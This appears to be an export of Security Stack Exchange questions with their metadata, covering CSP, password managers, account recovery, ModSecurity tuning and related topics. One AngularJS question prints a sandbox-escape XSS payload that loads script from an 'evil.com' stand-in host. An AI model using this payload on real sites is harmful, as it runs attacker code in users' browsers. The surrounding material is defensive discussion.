  <li>Well we haven't gotten a virus so far. Our network must be secure.  </li>
  <li>It might be my fault but you know how to fix it so I'm not worried.</li>
  </ul>
</blockquote></li>
</ul>

<p>Having done some company-wide rollouts in my time, I expected this, and am proceeding undeterred. I think people get the value of this (permissions on directories), even if they don't like it. I have also taken to doing some temptation pairing: as users are migrated to the domain, they get access to the slack channel and an updated version of MS Office, which they seem to like.</p>

<p>At the end of the day, I think people see this step as a minor annoyance and are going to pretty much go along with me no matter what I do, but I do worry that if the users see me as doing things they don't like or taking things away from them, they will stop coming to me when they find issues or try to ""find ways around me"" to do what they want. How can I get some buy-in from users that these sort of changes are what they are looking for?</p>

<p><em>Quick edit for P.S.</em>
 - Yes, I did dogfood and test my DC - my intern and I were using it for ~2 months before any users were even aware it existed.
 - Apologies if this is slightly off-topic - suggestions for edits are welcome.</p>
","106966","","106966","","2019-03-08 17:36:04","2019-03-08 17:36:04","How to convince users that security is a good thing?","<access-control><account-security><user-education><user-management>","2","0","","","","CC BY-SA 4.0"
"138115","1","","","2016-09-28 13:03:31","","2","552","<p>I do not see the point in using CSP 3's new <code>strict-dynamic</code> in the case of an AngularJS 1.x application.</p>

<p>As far as I can tell, using <code>strict-dynamic</code> still allows arbitrary Javascript injection via a sandbox escape in a template:</p>

<pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Angular - Alert in Expression&lt;/title&gt;
    &lt;script src=""https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js""&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body ng-app="""" ng-csp&gt;
    &lt;div&gt;{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,a=document.createElement(""script""),a.src=""https://evil.com/evil.js"",a.type=""text/javascript"",a=document.getElementsByTagName(""head"")[0].appendChild(a),a')}}&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>The worst thing is, the script injection above is allowed by <code>strict-dynamic</code>, whereas a reasonable host-based CSP <code>script-src</code> would block it.</p>

<p>So, is there any reason to use <code>strict-dynamic</code> on an application that uses AngularJS?</p>
","17506","","","","","2017-03-28 04:37:01","Is there any point in using 'strict-dynamic' in an AngularJS 1.x application?","<xss><content-security-policy><angularjs>","1","0","","","","CC BY-SA 3.0"
"138144","1","","","2016-09-28 17:45:24","","4","1584","<p>It is well known that the analysis of the keyboard sound can reveal/hint at what keys were pressed when a password is typed.</p>

<p>One could mix in wrong characters (not belonging to the password) with strokes of Backspace, Arrows, Delete, Home, End, etc that in the end would remove these wrong characters and leave the original password in the field.</p>

<p>One example: I can type <code>S</code> and <code>back-arrow</code> in tandem (ok, <code>S</code> a little before the back-arrow). The caret now is behind the <code>S</code>. When I press <code>delete</code>, the <code>S</code> character is removed, making this a zero-sum stroke combination. </p>

<p>Assuming visual inspection is impossible (the attacker has ""sound-only"" data from the password typing), does this add any security? </p>
","44336","","","","","2016-10-03 21:17:03","Does mixing in keystrokes of Backspace, Arrows and Delete add any security to password typing?","<passwords><security-theater><obscurity>","3","4","","","","CC BY-SA 3.0"
"205123","1","","","2019-03-10 22:11:01","","0","842","<p>I have an old private tablet at work with my private Google account on it .It's connected to our WiFi, where i logged in with my personal working code. Never use it much as I just play some music on it.</p>

<p>Today I saw that my browsing and history from my computer back home came up in Chrome on the tablet.</p>

<p>My question is: can my job see what am browsing at home just because am logged in on the tablet? Or is this information encrypted from Google? Never use the tablet at work for browsing purposes.</p>
","201575","","59503","","2019-03-10 23:08:48","2019-03-11 00:28:46","Private Google account at work","<google><chrome><account-security>","2","0","","","","CC BY-SA 4.0"
"138203","1","138209","","2016-09-29 08:59:08","","11","3775","<p>I am testing out the tool <a href=""https://csp-evaluator.withgoogle.com/"" rel=""noreferrer"">CSP Evaluator</a>, and have a question regarding the following content-security-policy:</p>

<blockquote>
  <p>default-src <a href=""https://maps.googleapis.com"" rel=""noreferrer"">https://maps.googleapis.com</a></p>
</blockquote>

<p>The tool consider this as a high risk:</p>

<blockquote>
  <p>maps.googleapis.com is known to host JSONP endpoints which allow to
  bypass this CSP.</p>
</blockquote>

<p>My question is, how can a trusted maps.googleapis.com be exploited to perform an XSS attack?</p>
","3165","","3165","","2016-09-29 11:57:06","2016-09-29 11:57:06","How does a trusted maps.googleapis.com in CSP enable an XSS vulnerability? (JSONP)","<xss><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"138253","1","138255","","2016-09-29 17:26:08","","2","311","<p>I just was wondering what is considered a common practice in the security community for securely sending files back forth between company and client. For example, at the company I work for, we receive Excel files from our clients through our web portal, we then review them and send them back via email. A problem came up where a file was emailed to the wrong client. </p>

<p>We have started using our website to transfer files back and forth since then, but the design and process by which documents are assigned to clients <em>-so that only they can see the document on their login-</em> is really not efficient. It is multiple steps and takes longer than it should to simply say ""<em>x</em> should see <em>y</em>"".</p>

<p>Anyway, the company I work for thinks that they're smarter than everyone else and no one really has any database, programming, IT, or security experience so they want to have these long drawn out conversations that are essentially reinventing the wheel. Reinventing the wheel in that there a common practices that companies utilize millions of times a day.</p>

<p>So this is the question. How are most companies sending their confidential information between themselves and clients?</p>

<p>I know with institutions I personally bank with or have credit cards through, it is all through their customer portal. They probably just have a more efficient way of assigning docs to clients than we have.</p>
","87104","","59403","","2016-09-29 20:23:12","2016-09-30 01:37:46","Securely transferring files back and forth between company and clients","<account-security><documents>","3","0","","","","CC BY-SA 3.0"
"464","1","478","","2010-11-18 22:00:03","","18","553","<p>If a security measure is implemented that doesn't provide any additional security benefit, can it be considered harmful?</p>

<p>As an example, consider a login page where the user is asked to enter their username, and then their password twice (for ""security reasons"").</p>

<p>There are two arguments here:</p>

<ol>
<li>If it gives the user peace of mind and isn't <em>decreasing</em> security, then what's the harm?</li>
<li>If there's no actual benefit, the additional ""peace of mind"" given to the user is harmful because it gives them a greater sense of security than is valid.</li>
</ol>

<p>I've frequently argued the second point, but the first opinion seems to be more common - particularly in the business community.</p>

<p>What do you think? Should redundant security measures be actively removed or is there really no harm in keeping them?</p>

<p><em>Note: the example isn't an actual case</em></p>
","179","","618","","2011-01-14 01:46:07","2011-01-14 15:50:31","Is a ""security measure"" that doesn't provide a security benefit actually harmful?","<web-application><passwords><security-theater>","7","1","","","","CC BY-SA 2.5"
"138361","1","","","2016-09-30 15:54:10","","13","4032","<p>If I delete an email from a popular provider (Gmail), would it be possible for somebody to register a new email account under the same name and use it to steal my identity? For example, my email address is abc@gmail.com and after it is deleted the name becomes available again so the attacker registers the same address - abc@gmail.com.</p>

<p>Not only would that person be able to impersonate me by sending emails from an address that belonged to me but also access accounts that were previously created with that email account (if they had any knowledge of where I was registered in, because the inbox would be empty, or they could also try logging in on popular websites like Facebook or Ebay to see if they return ""no account with this email address"" or ""wrong password"") and access them (by using ""I forgot my password"" links that send the link to reset the password to the email that is now in control of the attacker).</p>
","113958","","113958","","2016-09-30 16:09:01","2016-09-30 18:41:52","Is it dangerous to delete my email account?","<email><account-security><identity-theft>","2","1","","","","CC BY-SA 3.0"
"205378","1","205379","","2019-03-14 19:03:44","","1","182","<p>I'm planning to run/have some quite sensitive data on a VPS, however, knowing well that the host could at any time access the data (rare but as long as it could happen in theory, I would very much like to have some sort of contingency planning down). Could it be possible to practice some sort of ""damage control""?</p>

<p>For example, the method mentioned in:
<a href=""https://www.howtogeek.com/123568/how-to-get-email-notifications-whenever-someone-logs-into-your-computer/"" rel=""nofollow noreferrer"">https://www.howtogeek.com/123568/how-to-get-email-notifications-whenever-someone-logs-into-your-computer/</a></p>

<p>Would it be enough, as one would be notified whenever someone else accesses the server? Or can a host easily bypass it regardless? For example via a ""maintenance"" and then extraction, where internet would be off?</p>

<p>Although since most VPS providers claim 99% up-time and assuming that an ""evil host"" would probably initially check what's on a machine through internet first, inevitably having to log in. Would this be an okay method regardless? </p>

<p>Unless of course they have a very elaborate and near-impossible to detect monitoring software installed on every machine, which for example, occasionally takes screenshots, giving the provider information on which machine could be ""interesting"" to inspect further... although could this also, simply be combated by a re-formatting before usage?</p>

<p>Looking forward to any and all feedback</p>
","201931","","","","","2019-03-14 19:39:34","Could it be possible to diminish the damage of having one's VPS inspected by the host?","<access-control><account-security><physical-access><vps>","1","2","","","","CC BY-SA 4.0"
"138458","1","","","2016-10-01 13:11:56","","3","1318","<p>I heard in a podcast a while back (I believe it was Steve Gibson's <a href=""https://www.grc.com/securitynow.htm"" rel=""nofollow"">Security Now</a>) that running Windows as standard user vs. administrator mitigates 99% of Windows vulnerabilities (I <em>think</em> that was the correct percentage I heard). Anyone have a source to back this up? Also, what is the best way to configure this? What I did on my machine is enable the local admin account and added a strong password to it. I then changed my Microsoft account to standard user. Whenever I need admin permissions, I need to enter the password of the admin account I enabled. Is this the most secure way to enable this? </p>

<p>Also, anyone have any ideas why this is not always configured within.   organizations? I worked in security for a large consulting company, and this never came up. Users always run as admin vs. having to type a password. It seems like this would be the simplest way to drastically improve the security posture of the organization.</p>
","69190","","","","","2016-10-01 13:31:43","Security benefits of running as standard user vs. administrator","<windows><account-security><windows-permissions>","1","0","","","","CC BY-SA 3.0"
"138481","1","138482","","2016-10-01 21:02:15","","0","1562","<p>Everything I try to log into doesn't work. I constantly have to change my password through an email. It's really odd. </p>

<p>I do use the same password for most of my accounts. It's not something obvious mind you, but still, I use the same one or a variation of it. I have different special passwords and two-level steps for things that are important (like my email or my paypal account), but for Netflix and such I use my normal ""easy"" password. </p>

<p>That being said, I'm a rather cautions and aware user. I haven't downloaded or installed anything of suspicious nature. Also, I'm not sure this isn't a coincidence. Maybe I just forgot a few of my variations for these few different sites.</p>

<p>Anyway, to be on the safe side, what should I do now? Like, what's my immediate steps? I'm assuming my email wasn't hacked at this point.</p>
","80548","","","","","2016-10-01 21:43:12","My passwords keep getting rejected","<account-security>","1","2","","2016-10-02 17:26:49","","CC BY-SA 3.0"
"138483","1","138502","","2016-10-01 21:44:54","","3","6768","<p>Is it a great idea to make passwords with special characters from your language? (If you have it)</p>
<p>BTW it´s not allowed on every website.</p>
<p>Is it a way to make it a bit harder for hackers to crack your password?</p>
","126168","","6253","","2023-03-01 18:57:12","2023-03-01 18:57:12","Make password using special characters","<password-management><account-security>","2","3","","","","CC BY-SA 4.0"
"138684","1","138700","","2016-10-04 05:07:08","","3","2800","<p>In my Spring MVC 3 application, I am following REST patterns and lots of logic is based on HTTP status codes. For instance 500 defines a server error. But <a href=""https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/master/base_rules/modsecurity_crs_50_outbound.conf"" rel=""nofollow noreferrer"">OWASP modsecurity</a> says not to expose this status code.</p>

<p>I don't understand why a 500 status code would be bad?
I see even <a href=""https://i.stack.imgur.com/E0awT.png"" rel=""nofollow noreferrer"">Google showcases 500 properly</a>.</p>
","6862","","98538","","2016-10-04 09:12:08","2016-10-04 09:12:08","Should I expose HTTP status code 500 on a REST application?","<web-application><http><rest><mod-security>","2","2","0","","","CC BY-SA 3.0"
"138851","1","138852","","2016-10-05 18:32:37","","4","2226","<p>After a lot of research about password manager and a lot of reference obtained from this discussion
<a href=""https://security.stackexchange.com/questions/45170/how-safe-are-password-managers-like-lastpass"">How safe are password managers like LastPass?</a>
I come to the conclusion that password managers have some really scary point of failure, if my machine or mobile device is compromised when I use my master password and the U2F key to unlock the password manager (I am thinking something like yubikey or nitrokey) then all of my password can be stolen, even the ones that I use the less (like amazon account with my Credit Card information saved).</p>

<p>Reading the discussion and other opinions I got the impression that everyone says ""If you lose the security of your machine than you are already ******"", but there are cases when that isn't really true, think about the password that I use only a few times per year, like from online stores but with my CC credentials, in the time from the begin of the infection and the time I use the password I could get rid of the malware (formatting, antivirus) or I could use the password on another machine and the malware never gets this information.
With a password manager every password saved can be stolen.</p>

<p>So, I was thinking that the best way to use a password manager is to:</p>

<p>-never save critical password like bank account</p>

<p>-never let the password manager ""open"" (logged in)</p>

<p>-never use the autocomplete, even if the clipboard is another place unsecure and in this discussion tylerl had a point for the risk of fake sites 
<a href=""https://security.stackexchange.com/questions/45066/does-the-average-user-really-need-a-password-manager?noredirect=1&amp;lq=1"">Does the average user really need a password manager?</a>
But I read about some attacks via browser that can access even to other password without a trace, so better safe than sorry.</p>

<p>So reading the functionality for some of the most famous password managers, like lastpass or keepass, I was searching for a chance to decrypt only the single password needed, so if the machine is compromised only this password can be stolen. But it looks like it is impossible.</p>

<p>It's possible to add another layer of security?</p>

<p>What if I use an external drive to save the offline archive, with a different file system and encryption in read-only mode, that could help?</p>

<p>I know, I am a little paranoid, but when I am going to use some new software o practice I want to use the most secure and correct way to do it. So now I am confused and worried, I want a relatively simple way to access to my passwords but really difficult for others to get their hands on my data.</p>

<p>Sorry for my English</p>
","126539","","-1","","2017-03-17 13:21:41","2016-10-05 19:02:58","Password managers with U2F security risks","<passwords><password-management><account-security><u2f>","4","0","","","","CC BY-SA 3.0"
"205715","1","","","2019-03-19 17:04:24","","0","1518","<p>I'm not a security guy, so bear with me. As discussed in other topics, usernames in and of themselves are valid forms of verification, and there's nothing particularly sensitive or secure about usernames. For example, in most registration flows, when selecting a username, the system will tell the user whether a username is taken - thus potentially giving malicious users a list of valid usernames. And that's okay, the same things happen in most password recovery flows.</p>

<p>A suggested flow for a user that is trying to recover their forgotten username would be to allow them to type in their phone or email, and the system would instantly return their username in the UI without verification. </p>

<p>The main problem that I could see is that this may allow a malicious user to not only obtain the username, but also to associate it with phone/email. Maybe that's okay too though, because that doesn't give any vital information. To access an account, they would still need access to that phone or email to reset the password. In that respect I don't believe the account would be compromised. </p>

<p>Help me out, what are the flaws in my thinking here?</p>
","202301","","","","","2019-03-19 18:37:27","Account Recovery: Displaying username without verification","<account-security><password-reset><user-names><recovery>","2","0","","","","CC BY-SA 4.0"
"205772","1","205794","","2019-03-20 15:40:00","","2","626","<p>Here is an example of the CSP of accounts.google.com:</p>

<pre><code>content-security-policy: script-src 'nonce-DanEwkxkS1rktq35Z1hVcg' 'unsafe-inline' 'unsafe-eval';object-src 'none';base-uri 'self';report-uri /cspreport
</code></pre>

<p>The ""nonce"" means it will add a whitelist to a script that has the unique ID of ""DanEwkxkS1rktq35Z1hVcg"" (if I understand correctly). But after that, they allow use of inline script tags as well as the eval() function (through ""unsafe-inline"" and ""unsafe-eval"" respectively). So what's the point of giving a specific whitelist to a script with ID ""DanEwkxkS1rktq35Z1hVcg"", but also allowing all inline scripts? Do I fundamentally misunderstand something about how CSP works?</p>
","202382","","","","","2019-03-20 22:28:41","Trying to understand Content-Security-Policy: Why do some sites (e.g Google) use a ""nonce"", but also allow all inline scripts and use of eval()?","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"205866","1","","","2019-03-22 09:21:57","","1","84","<p>I am looking for any reliable, up-to-date sources (which may be RSS feeds, websites, or anything else OSINT-based) which contain password dumps and their relative links.</p>

<p>I am looking particularly for the full dumps.</p>

<p>Does anybody know where can I find them?</p>

<p>Thanks a lot.</p>
","186606","","","","","2019-03-22 09:21:57","Are there any reliable and updated sources or feeds for password dumps?","<passwords><account-security><have-i-been-pwned>","0","1","","2019-03-22 10:43:23","","CC BY-SA 4.0"
"139061","1","139068","","2016-10-07 11:55:12","","0","148","<p>I recently signed up for a webpage. When I opened the customary ""click this link to validate your email and pick a password"" email my client notified me that the sender had requested a read receipt. I opted not to send one, and could complete the sign up anyway.</p>

<p>I was a bit surprised, since this has never happend to me before on a similar email. Being of the curious kind, I started to speculate why they request receipts, and how they could be used to enhance security. Maybe it is related to token invalidation, but how?</p>

<p>I fail to understand how they could be used. Perhaps you have any ideas?</p>
","98538","","","","","2016-10-07 12:24:09","Can read receipt on sign up and password reset emails be used to enhance security?","<email><account-security><password-reset>","1","1","","","","CC BY-SA 3.0"
"139107","1","139111","","2016-10-07 18:23:49","","-1","244","<p>Assuming that person may leak the APK to another person with security expertise (and even tell the password), how do I ensure the app is made (practically) inaccessible to anyone but that person?</p>
","126782","","","","","2018-06-02 04:19:17","I'm building an Android app for one person and only that person should access it. How do I keep it secure?","<account-security>","2","1","","","","CC BY-SA 3.0"
"206048","1","","","2019-03-25 13:59:40","","0","231","<p>I am learning to design a system where it can be guarded against XSS &amp; CSRF attack. <br> I'll quickly list down my understanding and then raise questions. <br>It's a simple case of fraud that I am trying to avoid.<br><br> Steps mentioned below are executed by hacker: <br></p>

<ol>
<li>Broadcast e-mail to a lot of people holding account with any specific bank on gmail yahoo etc.</li>
<li>Once mail is received, script in background is executed from the email on-load , it checks if bank website is open in any of the tabs. If not, try after regular interval.</li>
<li>Hacker is aware that in the post request, only his account number needs to be updated and money would be transferred to his account</li>
<li>Common logic is written in front-end code which adds the headers and cookies on ever request sent to server.</li>
</ol>

<p><strong>Question:<br></strong>
Is the above attack possible?</p>

<p><strong>Answers: (From my understanding)<br></strong>
If hacker knows the payload required for fund transfer, hacker would simply hook onto mouse movement event and being aware about the url and payload would fire the request for fund transfer.<br> Cookies and other header details would be passed along as front-end team for simplicity have written logic to add these fields with every http request.<br><strong><em>Please corrent me if I am wrong.</em></strong></p>

<p>Please highlight if any of the steps undertaken by hacker(1-4) are not practically possible</p>
","202742","","195961","","2019-03-25 15:17:11","2021-05-11 09:08:10","Application design to avoid XSS & CSRF attacks","<xss><csrf><account-security><angularjs><react>","1","5","","","","CC BY-SA 4.0"
"206084","1","","","2019-03-25 19:13:41","","-2","224","<p>I recently received an email from a company sending me a security code that I didn’t ask for. It showed me the IP address that the request came from and it shows that it is in Romania but I live in the US. How can i report this adress?</p>
","202781","","","","","2019-03-25 20:37:54","What’s the best way to report an IP address from Romania?","<ip><account-security>","1","3","","","","CC BY-SA 4.0"
"206157","1","206161","","2019-03-26 18:00:14","","2","283","<p>In my college computer that runs Windows 7 Professional SP1 I have an administrator account. I have full access to the entire computer and the files of every other account that's signed up. </p>

<p>The problem is: I'm not the only administrator, and they have the same access level as I do. Every time after I'm done using the computer I have to clear my browser history, sign off of every application I was using and place my files in a password protected compacted file. All this process is really inconvenient and bothersome. I've been looking after a solution to this issue for a while now, and already considered:</p>

<ul>
<li><p>Creating a VM, using full-disk encryption. This obviously works but I'd like to avoid this.</p></li>
<li><p>Creating an encrypted volume with something like Veracrypt, the problem is that I could only install portable applications there (I think).</p></li>
<li><p>Encrypt my user folder. This would be a great solution that is available on Linux through eCryptfs, but I don't know if it's possible in Windows.</p></li>
</ul>

<p>All the solutions I found online do not consider a shared computer and multiple system admins. </p>

<p>I hope one of you has an answer to this.</p>
","202889","","6253","","2019-03-26 20:09:41","2019-04-30 05:35:05","Is it possible to create a truly private user account in a public computer?","<encryption><account-security><windows-7>","4","2","","","","CC BY-SA 4.0"
"41247","1","41252","","2013-08-26 16:41:18","","35","3632","<p>When Lotus Notes asks for the password, it displays a screen with a picture that appears to change after a new character is entered after the fifth character.</p>

<p><img src=""https://i.stack.imgur.com/Q1Phx.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/RQQx4.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/jqGc9.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/uf9su.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/6JeLX.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/WmE5Y.png"" alt=""Lotus Notes password prompting""></p>

<p>I have noticed the sequence of pictures is the same between closing and reopening Lotus Notes. Is this to distract an attacker from looking at the keyboard as someone types? Has this ever been proven effective? Also as far as I can tell a random amount of x's are added after each character is typed in. I guess this is so an attacker can't see the password length, but is there a point to having anything at all because the user doesn't know how many characters are typed?</p>

<p>EDIT: for what it's worth I didn't even realize the pictures were the same each time I typed in a password.</p>
","10714","","10714","","2013-08-27 17:08:59","2020-09-11 11:44:53","Changing picture as characters entered into password","<passwords><security-theater>","3","5","","","","CC BY-SA 3.0"
"253962","1","","","2021-08-04 13:57:38","","0","317","<p>In case we lose access to our 2 Factor Authenticator, we can use our one time recovery codes to regain access to our accounts</p>
<p>But what if we store the setup key itself instead of the recovery codes? We can still recover the account by adding the setup key to another authenticator.</p>
<p>I think recovery keys are better because they can be shared with other trustable people to keep them safe for you. If a recovery code has been used, we get notified. And they are limited in number.</p>
<p>Are there any other security implications?</p>
","264243","","6253","","2021-08-04 15:33:06","2021-08-04 17:14:28","Should I save my 2FA setup keys instead of recovery keys?","<authentication><account-security><multi-factor><recovery>","1","4","","","","CC BY-SA 4.0"
"115548","1","","","2016-02-23 21:32:32","","1","976","<p>Trying to connect to GoogleTalk from the Trillian app for Android (a universal instant messenger app), I got denied even with the correct password. Then Google e-mailed me saying that my password is compromised and that an access to my account was blocked from IP <code>74.201.35.40</code> (somewhere in the USA).</p>

<p>Does it mean the Trillian application is spoiled (trying to steal my Google account), or is it just poorly programmed so that it's their server that connects to Google rather than me? Or something else? Should I stop using the app?</p>
","21430","","21430","","2016-02-23 23:03:09","2016-06-22 12:42:52","Is Trillian application unsafe? (Got ""Someone has your password"" message from Google)","<passwords><android><google><account-security>","1","5","","","","CC BY-SA 3.0"
"254084","1","","","2021-08-08 16:43:58","","-1","206","<p>I have an application that rewards users for placing orders with certain merchants. In order to verify that the order was actually placed and delivered, a user is required to grant us read access to a new <a href=""https://stackoverflow.com/a/36894292"">Gmail Inbox</a> that is created and shared with us for this purpose. This allows us to read order confirmation emails, shipping confirmation emails and for some merchants the delivery email. If the order was canceled then we'd be able to read the order cancellation email as well. The goal is to minimize the risk of a user placing an order on a merchant site and then canceling it without us knowing about it. I have a few doubts about this approach:</p>
<ol>
<li><p>Can a user spoof the contents of an email to make it look like an order or delivery confirmation email was received from a merchant when in fact wasn't?</p>
</li>
<li><p>Can a user delete an order cancellation email from his inbox before we get a chance to read it? If yes, is there a to detect that an email was deleted?</p>
</li>
<li><p>I realize a user can revoke access to his inbox at any time, add or remove emails and then re-grant access. However, I don't think this would be a problem because should we detect that access was revoked at any time between the order and delivery we can reverse any rewards linked to those orders. Is this correct?</p>
</li>
<li><p>Are there any other risks associated with this approach?</p>
</li>
<li><p>Would the same apply to other email providers such as Outlook (Microsoft), Apple and Yahoo Mail?</p>
</li>
</ol>
<p>We do have other ways of confirming orders but each approach has certain flaws and weaknesses. My goal is to understand the weakness of this approach (if any) and work with the strengths of each approach to eliminate or reduce the likelihood of fraud.</p>
<p>How reliable is this approach?</p>
","264419","","6253","","2021-08-09 22:41:01","2021-08-09 22:41:01","Is it Safe to Rely on Gmail API to Reward Users for Placing Orders on Merchant Sites?","<email><account-security><gmail><email-spoofing><fraud>","2","6","","","","CC BY-SA 4.0"
"254155","1","254164","","2021-08-11 00:39:31","","2","365","<p>If I get hit with malware while performing daily tasks (e.g. - checking email, web browsing, etc.) with a root shell, the malware will own my machine.</p>
<p>If the aforementioned occurs whilst on a standard account with the ability to run sudo, the malware will be limited to whatever privileges this account has without sudo.</p>
<p>What if the malware had the ability to log keystrokes? Would it not just capture the password the next time I elevate my privileges with sudo, thereby, gaining the ability to become root? Do I have this wrong? If not, I think it would be safer to create another standard account without the ability to use 'sudo' and use that for my daily tasks. Is this common?</p>
","186033","","","","","2021-08-11 10:01:47","If browsing the web with root is dangerous, isn't browsing the web with a sudo enabled account only marginally safer?","<linux><account-security><privilege-escalation><principle-of-least-privilege>","1","0","","","","CC BY-SA 4.0"
"254193","1","255184","","2021-08-12 09:45:02","","1","2926","<p>I am bewildered as to the below config and subsequent behaviour.</p>
<p>/etc/ssh/sshd_config:</p>
<pre><code>AuthorizedPrincipalsFile /etc/ssh/principals
</code></pre>
<p>/etc/ssh/principals:</p>
<pre><code>all
host.example.com
dev
</code></pre>
<p>This allows me to login as <em>ANY</em> user using my cert which has one or more matching principals.</p>
<p>What am I missing here?</p>
<p>I see now it's meant to be:</p>
<pre><code>AuthorizedPrincipalsFile /etc/ssh/principals/%u
</code></pre>
<p>but surely my (mis)configuration should not allow any user?</p>
<p>Ubuntu 18.04.5 LTS<br />
OpenSSH_7.6p1 Ubuntu-4ubuntu0.3, OpenSSL 1.0.2n  7 Dec 2017</p>
","242574","","","","","2021-09-13 16:38:27","OpenSSH AuthorizedPrincipalsFile Allows Any User","<authentication><certificates><certificate-authority><account-security><openssh>","1","0","","","","CC BY-SA 4.0"
"182405","1","","","2018-03-27 15:05:43","","0","1060","<p>I'm looking to build up some stats and tune my detection rules for my webservers. I'm struggling with one major issue, though. How can I run my ModSecurity rules against past requests based on my access/error logs?</p>

<p>An other approach could be to extract regexes from ModSecurity but I struggle to find a way to do that.</p>
","174086","","98538","","2018-03-27 17:20:33","2018-08-15 18:35:40","How to test ModSecurity rules against access/error logs?","<waf><mod-security>","2","0","","","","CC BY-SA 3.0"
"254302","1","","","2021-08-16 14:40:33","","0","112","<p>Let's say there is a small organization called &quot;Example&quot; with the registered domain &quot;example.com&quot;.</p>
<p>There is a person, Bob, who has full control over the organization's GitHub account. Bob also manages the organization's AWS account.</p>
<p>Bob also writes BAU code for this organization.</p>
<p>In order to follow the modern security standards, what should be the setup of Bob's emails and accounts?</p>
<p>Some example setups (not exhaustive, just to illustrate what I mean):</p>
<p>Example 1:</p>
<ul>
<li>1 email bob@example.com</li>
<li>1 AWS account registered with this email used for admin and dev purposes</li>
<li>1 GitHub account registered with this email used for admin and dev purposes</li>
</ul>
<p>Example 2:</p>
<ul>
<li>1 email bob@example.com</li>
<li>2 AWS accounts:
<ul>
<li>1 registered with bob@example.com used for admin purposes</li>
<li>1 registered with alias bob-2@example.com for dev purposes</li>
</ul>
</li>
<li>2 GitHub accounts: AWS-like arrangement</li>
</ul>
<p>Example 3:</p>
<ul>
<li>3 emails: bob_admin_github@example.com, bob_admin_aws@example.com, bob_dev@.example.com</li>
<li>2 AWS accounts:
<ul>
<li>1 registered with bob_admin_aws@example.com for admin purposes</li>
<li>1 registered with bob_dev@example.com for dev purposes</li>
</ul>
</li>
<li>2 GitHub accounts:
<ul>
<li>1 registered with bob_admin_github@example.com used for admin purposes</li>
<li>1 registered with bob_dev@example.com for dev purposes.</li>
</ul>
</li>
</ul>
","264758","","6253","","2021-08-16 14:42:52","2021-08-16 14:42:52","How many emails and accounts an organization's administrator and developer should have?","<email><account-security><privileged-account><administration>","0","2","","","","CC BY-SA 4.0"
"254333","1","254334","","2021-08-17 08:33:01","","1","448","<p>In a recent PT assignment, I overcame that a CSP policy where the <code>object-src</code> be set to <code>self</code>. When validated against Google CSP Evaluator, it reported that it the <code>object-src</code> can be set to <code>none</code> instead of <code>self</code>.</p>
<p>Would like to ask for scenarios where the <code>object-src</code> tag can be abused when it is set to <code>self</code>, as I am unable to think of any possible scenario where this can be abused when a user is unable to interact with the website (no places to login, or specify any inputs).</p>
<p>And hence, in this case it is safe to for the <code>object-src</code> tag to remain as <code>self</code> and not <code>none</code>?</p>
","257055","","","","","2021-08-17 10:07:22","HTML Object Tag","<web><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"182551","1","182570","","2018-03-29 12:48:58","","0","1306","<p>Working on a rule to block traffic based on the starting character of ARGS_NAMES either cookie, get or post </p>

<p>Example allow </p>

<p><code>name=Joe</code></p>

<p>Example block</p>

<pre><code>#name=Joe
</code></pre>

<p>Test rule that is not working</p>

<pre><code>SecRule ARGS_NAMES ""^(#.*)$"" ""phase:1,id:199,log,deny,msg:'Block Argname with hash'""
</code></pre>
","110480","","110480","","2018-03-29 14:06:28","2019-08-10 17:02:45","ModSecurity Block based on ARGS_NAMES starting character","<waf><mod-security>","2","0","","","","CC BY-SA 3.0"
"115914","1","115915","","2016-02-27 12:32:18","","-1","262","<p>I used browser developer tools to get the source page of a video from a webpage.</p>

<p>When I try to open the full URL containing the video, I see my public ip address is contained in that URL.</p>

<p>Changing that ip address to some other value, or omitting the ip address altogether does not let me download the video. I save the page, but get an empty .mp4 file.</p>

<p>Also, I found out that the video URL was contained inside a javascript section, not the html section. Does this have any relevance to what I am asking?</p>
","102765","","","","","2016-02-27 12:52:44","Why does a CDN server need my IP address to let me download a video?","<web-application><content-security-policy>","1","2","","2016-02-29 10:35:46","","CC BY-SA 3.0"
"254392","1","254395","","2021-08-19 14:01:01","","1","539","<p>We have an issue with ModSecurity rule 932150 being triggered when someone searches a site for &quot;ruby red&quot;, because (I presume) the rule thinks it's blocking potential Ruby on Rails code.</p>
<p>I found this:</p>
<blockquote>
<p>&quot;The Remote Command Execution Rule with the rule id 932150 is
triggered by a Unix command followed by a white space. Therefore zip+
and gzip+ trigger the rule, but not zip and gzip alone.&quot;</p>
</blockquote>
<p>(source: <a href=""https://security.stackexchange.com/questions/251556/modsecurity-owasp-crs-3-3-0-false-positives-on-a-wordpress-site/251583#251583"">ModSecurity OWASP CRS 3.3.0 false positives on a Wordpress site</a> )</p>
<p>The answer above has example code to disable checks on the argument <code>s</code>, e.g. <code>/search.php?s=ruby+red</code> but I don't want to disable checks on the full <code>s</code> argument. I'd like to only remove 'ruby' from the rule checks, so <code>s</code> is still checked but allows 'ruby'. Is this possible?</p>
","264899","","6253","","2021-08-19 14:34:16","2021-08-19 15:16:15","ModSecurity rule 932150 false positive, remove ruby from criteria","<mod-security>","1","0","","","","CC BY-SA 4.0"
"182893","1","","","2018-04-04 07:39:08","","4","139","<p>I'm looking at 2FA options for my Google account, and I noticed they now allow you to add a security key to your account. I'm a bit of a novice to infosec, but I'm struggling to see the benefit for me. My phone already covers the ""something you have"" component of account security. </p>

<p>The only thought I have is that a phisher could ask me to enter my 2FA code and use that to log in, and I might not notice. But I see no reason why a phisher couldn't ask me to tap the button on my security key, too.</p>

<p>Are there additional benefits to the security key that I'm not seeing?</p>
","","user43639","98538","","2018-04-04 08:01:29","2018-04-04 16:42:10","Is there a benefit to setting up a security key on an account that already has phone-based 2FA?","<authentication><account-security><u2f><hardware-token>","1","0","","","","CC BY-SA 3.0"
